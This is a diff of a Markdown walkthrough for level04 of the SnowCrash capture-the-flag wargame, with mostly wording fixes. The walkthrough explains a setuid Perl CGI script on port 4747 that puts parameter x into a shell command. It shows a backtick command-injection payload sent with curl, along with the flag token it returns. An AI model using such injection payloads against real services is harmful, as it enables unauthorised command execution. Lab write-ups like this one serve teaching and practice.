@@ -1,9 +1,9 @@
-# level04 - CGI Perl Script
+# level04 - Hack Perl
 
 ## Home
 
-- `level04 home` contains a perl script named `level04.pl` that belongs to `flag04`.
-- The script is SETUID and SETGID. It will executed with `flag04` permissions.
+- `level04` home contains a perl script named `level04.pl` that belongs to `flag04`.
+- The script is SETUID and SETGID. It will be executed with `flag04` permissions.
 
 ```
 level04@SnowCrash:~$ ls -al
@@ -18,7 +18,8 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 
 ## `level04.pl`
 
-- The file seems to be a cgi script running on localhost, port 4747. It echo the request parameter named x.
+- The file seems to be a cgi script running on localhost, port 4747.
+- It echo the request parameter named `x`.
 
 ```
 level04@SnowCrash:~$ cat level04.pl
@@ -34,7 +35,7 @@ x(param("x"));
 level04@SnowCrash:~$
 ```
 
-## Apache on port 4747
+## Apache On Port 4747
 
 - A service is effectively running on port 4747 under a `TCPv6` protocol.
 
@@ -94,11 +95,11 @@ level04@SnowCrash:~$ cat /etc/apache2/sites-enabled/level05.conf
 </VirtualHost>
 ```
 
-> Notice that there is also an Apache conf file for level12.
+> Notice that there is also an Apache configuration file for level12.
 
 ## `getflag` over IP
 
-- As the parameter x is in a shell command executed as `flag04`, we can try a command injection to execute the `getflag` program:
+- As the parameter `x` is injected in a shell command executed as `flag04`, we can try a command injection to execute the `getflag` program:
 
 ``level04@SnowCrash:~$ curl 'localhost:4747?x=`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap``
